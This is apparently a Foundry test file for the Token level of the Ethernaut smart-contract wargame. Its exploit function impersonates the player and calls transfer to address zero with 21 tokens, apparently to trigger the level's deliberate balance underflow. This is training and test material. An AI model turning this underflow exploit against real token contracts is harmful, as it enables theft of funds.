// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

import {Ethernaut} from "../game/Ethernaut.sol";
import {Token} from "../levels/Token/Token.sol";
import {TokenFactory} from "../levels/Token/TokenFactory.sol";
import {LevelTest} from "./common/LevelTest.sol";

contract TokenTest is LevelTest {
    Token private level;

    constructor() {
        levelFactory = new TokenFactory();
    }

    function testToken() public {
        run();
    }

    function init() internal override {
        levelAddress = payable(this.create());
        level = Token(levelAddress);
    }

    function exploit() internal override {
        vm.startPrank(player);
        level.transfer(address(0), 21);
        vm.stopPrank();
    }
}